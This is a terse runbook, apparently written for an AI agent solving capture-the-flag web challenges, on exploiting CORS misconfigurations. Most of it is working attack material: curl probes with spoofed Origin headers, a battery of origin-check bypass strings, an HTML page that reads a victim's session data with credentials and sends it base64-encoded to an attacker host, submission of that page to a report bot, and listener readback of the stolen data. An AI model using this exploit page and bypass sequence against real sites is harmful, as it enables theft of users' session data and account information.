# Field manual — the CORS runbook for an agent mid-exploit

The tactical sequence — what to run, what to read, what to try next.

---

## T+0: the orientation — is this a CORS-read target

```bash
# the endpoint's response — does it carry session data?
curl -s -b "$CJ" "$BASE/api/me" | head -c 300
# a session-scoped response → the read target exists
```

## T+2: the central measurement — ACAO + ACAC

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
#   reflected+ACAC → the vuln; * → public; fixed → closed
```

## T+4: the credential check — does the cookie ride

```bash
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   SameSite=None; Secure → attaches; else → non-credentialed
```

## T+6: the bypass battery — naming the check

```bash
for o in 'https://evil.com' 'null' 'https://target.com.evil.com' \
         'https://eviltarget.com' 'https://sub.target.com' \
         'https://target.com@evil.com'; do
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin'; done
```

## T+10: the exploit page — build it

```html
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

## T+12: the delivery — the page reaches the bot

```bash
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL for an airgapped/null-origin case
```

## T+15: the readback — the exfil hit

```bash
python3 tools/web/oob_listener.py hits
# the session data arrives → the read worked
```

## The stuck-decision tree

```text
ACAO reflected + ACAC + cookie-ride    → build the page — nearly there
ACAO *                                  → public — a different target
ACAO fixed (bypassable)                 → the battery — a lookalike
ACAO null                               → a data:/sandboxed page
no ACAC                                 → non-credentialed — a public read
cookie SameSite-gated                   → non-credentialed — check a Bearer
a strict allowlist + no bypass          → dead — pivot to JSONP/XSSI/websocket
a permissive preflight + strict actual  → a simple-request read
an airgapped bot                        → a data: URL or stored page
```

## The five-probe budget — the bounded sweep

```text
probe 1: the Origin replay — the central measurement
probe 2: the cookie-SameSite check
probe 3: the bypass battery (a batch — one sweep)
probe 4: the exploit page on YOUR browser — does the read work
probe 5: the delivery to the bot — the exfil hit
a spend without a confirm → escalate — a different vector
```

## The evidence ledger — every step recorded

```bash
python3 tools/state.py <c> --hypothesis "cors: <shape> on /api/x"
python3 tools/hooks.py post-probe <c> --verdict <v> --hypothesis-id <H> \
  --class web-cors --evidence-kind <class|impact> \
  --evidence '<what the probe showed>' --response '<the bytes>'
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source 'GET /x?d=...' --evidence '<the exfil hit>'
```

## The don't-do list

```text
don't claim a `*` endpoint is the vuln — it's a public read
don't claim a reflected ACAO is the exploit — it's a candidate
don't set Origin via JS — it's browser-set
don't test in YOUR browser alone — the bot's context differs
don't claim a read that didn't exfil — the OOB hit is the proof
```
